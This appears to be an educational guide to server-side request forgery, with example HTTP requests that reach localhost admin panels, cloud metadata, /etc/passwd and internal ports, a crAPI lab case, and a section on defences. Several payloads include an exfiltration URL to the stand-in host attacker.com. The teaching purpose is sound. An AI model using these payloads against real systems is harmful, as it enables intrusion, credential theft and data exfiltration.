# 🌐 Server-Side Request Forgery (SSRF)

## What It Is

**Server-Side Request Forgery (SSRF)** lets an attacker trick a server into making requests it was never meant to make — often reaching internal or otherwise unreachable systems by pivoting through the vulnerable server itself.

Instead of attacking a system directly, the attacker uses the server as a proxy: feed it a URL, and the server fetches it on the attacker's behalf, including URLs that point at things the attacker could never reach directly from outside.

---

## 🔍 Example 1 — Reaching an Internal Service

**Request:**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:8080/admin"
}
```

**Vulnerable response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body>
<h1>Welcome to the Admin Panel</h1>
<form>
  <input type="password" placeholder="Admin Password">
</form>
</body>
</html>
```

**The problem:** the app fetches whatever URL it's given, with no real validation. That means an attacker can point it at `127.0.0.1`, `localhost`, `169.254.169.254`, or any private IP range — potentially exposing internal admin panels, metadata services, or other systems that were never meant to face the public internet.

**Impact:**
- 🔐 Internal-only resources become reachable
- 👤 Risk of leaking internal APIs, metadata, or credentials
- 🧨 A potential pivot point for further internal network attacks

**Mitigations:**
1. Validate and sanitize every URL — only allow approved external destinations
2. Block requests to internal/reserved IP ranges and localhost
3. Maintain both an allowlist and a denylist for outbound URLs
4. Route outbound requests through a controlled proxy/gateway with strict filtering
5. Parse URLs strictly and reject anything malformed or obviously obfuscated

## 🔍 Example 2 — Hitting the Cloud Metadata API

**Request:**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

**Vulnerable response:**
```http
HTTP/1.1 200 OK
Content-Type: text/plain

ami-id: ami-12345678
instance-type: t2.micro
public-hostname: ec2-198-51-100-1.compute-1.amazonaws.com
```

**Impact:**
- ☁️ Cloud instance metadata gets exposed
- 🔐 Potential leak of credentials tied to a cloud service role
- 🧨 Can enable lateral movement deeper into the cloud environment

## 🔍 Example 3 — Reading Local Files via `file://`

**Request:**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "file:///etc/passwd"
}
```

**Vulnerable response:**
```http
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Impact:**
- 📁 Arbitrary file read straight from the server's filesystem
- 🔓 Exposure of system accounts, which expands the available attack surface
- 🔐 Risk of leaking secrets sitting in config files

## 🔍 Example 4 — Exfiltrating Data

**Request:**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://attacker.com/log?data=sensitive-data"
}
```

**What happens server-side:**
```http
GET /log?data=sensitive-data HTTP/1.1
Host: attacker.com
User-Agent: vulnerable-app-proxy
```

**Impact:**
- 🕵️ Sensitive data ends up shipped straight to a server the attacker controls
- ↩️ The vulnerable server becomes an unwitting exfiltration channel
- 🧨 Could even support a crude command-and-control setup

## 🔍 Example 5 — Internal Port Scanning

**Open port:**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:22"
}
```
```http
HTTP/1.1 200 OK
Content-Type: text/plain

SSH-2.0-OpenSSH_7.9
```

**Closed port:**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:81"
}
```

**Impact:**
- 🔍 By comparing responses, an attacker can map which internal ports are open
- 🌐 That mapping fuels deeper internal reconnaissance and follow-on attacks

## 🔍 Example 6 — DNS Rebinding

**Request:**
```http
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://rebind.victim.com"
}
```
```http
HTTP/1.1 200 OK
Content-Type: text/plain

Internal Service Response Detected
```

**Impact:**
- 🌍 A domain that initially resolves to a safe IP can later flip to resolve to an internal one, slipping past any host-based filtering
- 🧩 This abuses DNS resolution timing to dodge simple allowlist checks
- 🔓 Can enable remote access to internal resources that should never be reachable externally

## 🔍 Example 7 — Real-World Pattern: SSRF via a User-Controlled Callback URL

This kind of bug shows up in labs like crAPI, where a "contact a mechanic" or similar feature lets the client specify *where* the backend should send a follow-up request.

**Endpoint:**
```
http://<target-host>/workshop/api/merchant/contact_mechanic
```

**Request:**
```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: <target-host>
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "mechanic_code": "<mechanic_code>",
  "problem_details": "test",
  "vin": "<vehicle_vin>",
  "mechanic_api": "http://<callback-host>:8025",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

**The problem:** the `mechanic_api` field is fully client-controlled, and the backend dutifully sends an HTTP request to whatever URL shows up there. That's a textbook SSRF entry point.

### 🧪 What an Attacker Could Try

- Reach an internal service:
  `"mechanic_api": "http://127.0.0.1:8080/admin"`
- Pull cloud metadata:
  `"mechanic_api": "http://169.254.169.254/latest/meta-data/"`
- Run a basic port scan:
  `"mechanic_api": "http://127.0.0.1:22"`
- Exfiltrate data:
  `"mechanic_api": "http://attacker.com/log"`

**Impact:** the application effectively becomes an open proxy for the attacker, capable of reaching both internal and external systems on their behalf.

## 🛡️ How to Defend Against SSRF

### Input Validation
- Only allow URLs pointing to explicitly trusted domains (allowlist)
- Block requests to localhost and private IP ranges
- Re-validate the *resolved* IP address after DNS lookup — not just the hostname string

### Restrict Protocols
Disable schemes that have no business being fetched server-side:
- `file://`
- `ftp://`
- `gopher://`

Stick to `http://` and `https://` only for outbound requests.

### Network-Level Controls
- Apply egress filtering on outbound traffic
- Restrict network-layer access to internal services
- Keep internal networks properly segmented away from application servers

### Cloud-Specific Protections
- Enforce metadata service protections (e.g. IMDSv2 on AWS)
- Apply least-privilege permissions to cloud service roles
- Block or restrict access to metadata endpoints from application servers entirely

### Application-Level Controls
- Avoid directly fetching arbitrary user-supplied URLs
- Route any such requests through an intermediary service with strict validation
- Log and monitor outbound requests for unusual destinations
- Consider request signing/verification for any callback-style features
